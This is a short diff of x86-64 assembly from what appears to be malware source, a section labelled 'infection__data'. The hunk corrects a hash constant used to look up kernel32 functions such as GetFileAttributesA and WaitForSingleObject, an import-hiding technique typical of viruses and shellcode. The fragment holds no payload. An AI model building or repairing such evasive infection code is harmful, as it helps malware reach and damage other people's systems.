@@ -41,7 +41,7 @@ infection__data:
    call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0xda1a7563)
    mov rsi, rax                 ; get function for GetFileAttributesA
    mov rcx, r12
-   mov edx, 0x53b2070f
+   mov edx, 0x71948ca4
    call get_proc_by_hash        ; get_proc_by_hash(kernel32_module, 0x71948ca4)
    mov rdi, rax                 ; get function for WaitForSingleObject
    mov rcx, r12
